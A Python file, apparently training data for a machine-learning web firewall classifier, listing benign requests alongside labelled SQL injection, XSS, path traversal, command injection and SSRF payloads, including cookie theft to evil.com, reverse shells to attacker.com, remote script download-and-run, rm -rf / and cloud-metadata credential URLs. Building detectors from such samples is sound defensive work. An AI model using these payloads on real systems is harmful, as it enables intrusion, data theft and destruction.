from __future__ import annotations

from typing import List, Tuple


def build_dataset() -> Tuple[List[str], List[str]]:
    """
    Синтетический датасет для обучения ML классификатора WAF.
    Содержит примеры нормальных запросов и 5 типов атак:
    SQLI, XSS, TRAVERSAL, CMD, SSRF
    """
    
    # Нормальные запросы
    benign = [
        "GET /home q=hello",
        "GET /api/users name=user&page=1",
        "POST /login content-type=application/json",
        "GET /search q=product",
        "GET /items page=home",
        "POST /api/data items=1,2,3",
        "GET /profile id=123",
        "GET /search q=test",
        "POST /form name=test&email=test@example.com",
        "GET /api/list limit=10&offset=0",
        "GET /api/products category=electronics&sort=price",
        "POST /api/orders content-type=application/json user_id=456",
        "GET /dashboard tab=overview",
        "GET /api/status service=web",
        "POST /upload filename=document.pdf",
        "GET /api/reports date=2024-01-15",
        "GET /news article=12345",
        "POST /api/comments post_id=789&text=great article",
        "GET /settings section=notifications",
        "GET /api/search term=laptop&limit=20",
    ]
    
    # SQL Injection
    sqli = [
        "GET /api/items id=1 OR 1=1",
        "GET /api/users q=' OR '1'='1",
        "GET /login name=admin' --",
        "GET /api/items id=1; DROP TABLE users",
        "GET /search q=1 UNION SELECT * FROM users",
        "GET /api/data id=' OR ''='",
        "GET /api/users id=1' AND '1'='1",
        "GET /login user=' OR 1=1 --&pass=x",
        "GET /api/search q='; DELETE FROM sessions; --",
        "GET /api/items id=1 UNION SELECT password FROM users",
        "GET /api/data field=1'; EXEC xp_cmdshell('dir'); --",
        "GET /search q=' HAVING 1=1 --",
        "GET /api/users id=1 AND SLEEP(5)",
        "GET /api/items id=1' AND BENCHMARK(5000000,SHA1('test'))--",
        "GET /login user=admin'/*&pass=*/--",
        "GET /api/search q=' OR '1'='1' /*",
        "GET /api/data id=1'; INSERT INTO log VALUES('hack');--",
        "GET /api/users q=-1' UNION SELECT table_name FROM information_schema.tables--",
    ]
    
    # Cross-Site Scripting (XSS)
    xss = [
        "GET /search q=<script>alert(1)</script>",
        "GET /page term=<img src=x onerror=alert(1)>",
        "GET /search value=javascript:alert(1)",
        "GET /api/html body=<svg onload=alert(1)>",
        "GET /search q=<iframe src=javascript:alert(1)>",
        "GET /comment text=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "GET /profile bio=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "GET /search q=<body onload=alert('XSS')>",
        "GET /page title=<svg/onload=alert(String.fromCharCode(88,83,83))>",
        "GET /api/echo msg=<input onfocus=alert(1) autofocus>",
        "GET /search q=<marquee onstart=alert(1)>",
        "GET /comment text=<details open ontoggle=alert(1)>",
        "GET /profile name=<a href=javascript:alert(1)>click</a>",
        "GET /search q=<img src='x' onerror='window.location=\"http://evil.com?c=\"+document.cookie'>",
        "GET /page data=\"><script>alert(document.domain)</script>",
        "GET /api/html content=<object data=javascript:alert(1)>",
    ]
    
    # Path Traversal
    traversal = [
        "GET /api/files path=../../etc/passwd",
        "GET /download file=../../../secret.txt",
        "GET /api/files target=../app/main.py",
        "GET /read path=....//....//etc/shadow",
        "GET /api/files file=%2e%2e%2f%2e%2e%2fetc/passwd",
        "GET /api/download path=..\\..\\..\\windows\\system32\\config\\sam",
        "GET /files file=....//....//....//etc/hosts",
        "GET /api/read doc=%252e%252e%252f%252e%252e%252fetc/passwd",
        "GET /download name=../../../proc/self/environ",
        "GET /api/files path=/etc/passwd",
        "GET /files doc=..%2f..%2f..%2fetc%2fpasswd",
        "GET /read file=..%c0%af..%c0%af..%c0%afetc/passwd",
        "GET /api/download path=....\\....\\....\\boot.ini",
        "GET /files name=..%252f..%252f..%252fetc/shadow",
        "GET /api/read file=..././..././..././etc/passwd",
    ]
    
    # Command Injection
    cmd = [
        "GET /api/ping host=127.0.0.1;cat /etc/passwd",
        "GET /api/dns domain=example.com|whoami",
        "GET /api/exec cmd=ls -la",
        "GET /api/ping host=$(cat /etc/passwd)",
        "GET /api/system command=`id`",
        "GET /api/ping host=127.0.0.1 && cat /etc/shadow",
        "GET /api/dns domain=x;wget http://evil.com/shell.sh;bash shell.sh",
        "GET /api/exec param=test|nc -e /bin/sh attacker.com 4444",
        "GET /api/ping host=;curl http://evil.com/$(whoami)",
        "GET /api/system cmd=import os; os.system('id')",
        "GET /api/dns domain=x`curl attacker.com`",
        "GET /api/ping host=127.0.0.1;python -c 'import socket;import subprocess'",
        "GET /api/exec command=test;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "GET /api/system param=;rm -rf /",
        "GET /api/ping host=test$(wget -O- http://evil.com/backdoor.sh|sh)",
        "GET /api/dns lookup=x;perl -e 'system(\"id\")'",
        "GET /api/exec cmd=__import__('os').system('cat /etc/passwd')",
        "GET /api/system input=;php -r 'system(\"ls -la\");'",
    ]
    
    # Server-Side Request Forgery (SSRF)
    ssrf = [
        "GET /api/fetch url=http://localhost/admin",
        "GET /api/proxy dest=http://127.0.0.1:8080/secret",
        "GET /api/webhook callback=http://169.254.169.254/latest/meta-data/",
        "GET /api/fetch url=http://10.0.0.1/internal",
        "GET /api/proxy dest=http://192.168.1.1/admin",
        "GET /api/avatar image_url=http://localhost:6379/",
        "GET /api/fetch url=file:///etc/passwd",
        "GET /api/proxy dest=gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall",
        "GET /api/webhook callback=http://[::1]/admin",
        "GET /api/fetch url=http://0.0.0.0:22/",
        "GET /api/proxy dest=dict://localhost:11211/stats",
        "GET /api/avatar image_url=http://metadata.google.internal/computeMetadata/v1/",
        "GET /api/fetch url=http://172.16.0.1/internal-api",
        "GET /api/proxy dest=http://169.254.169.254/latest/api/token",
        "GET /api/webhook callback=ftp://internal-ftp.local/sensitive",
        "GET /api/fetch url=http://localhost:9200/_cat/indices",
        "GET /api/proxy dest=http://127.0.0.1:27017/admin",
        "GET /api/avatar image_url=http://instance-data/latest/meta-data/iam/security-credentials/",
        "GET /api/fetch url=ldap://localhost/dc=internal,dc=corp",
        "GET /api/proxy dest=http://[0:0:0:0:0:ffff:127.0.0.1]/admin",
    ]
    
    texts = benign + sqli + xss + traversal + cmd + ssrf
    labels = (
        ["BENIGN"] * len(benign) +
        ["SQLI"] * len(sqli) +
        ["XSS"] * len(xss) +
        ["TRAVERSAL"] * len(traversal) +
        ["CMD"] * len(cmd) +
        ["SSRF"] * len(ssrf)
    )
    
    return texts, labels
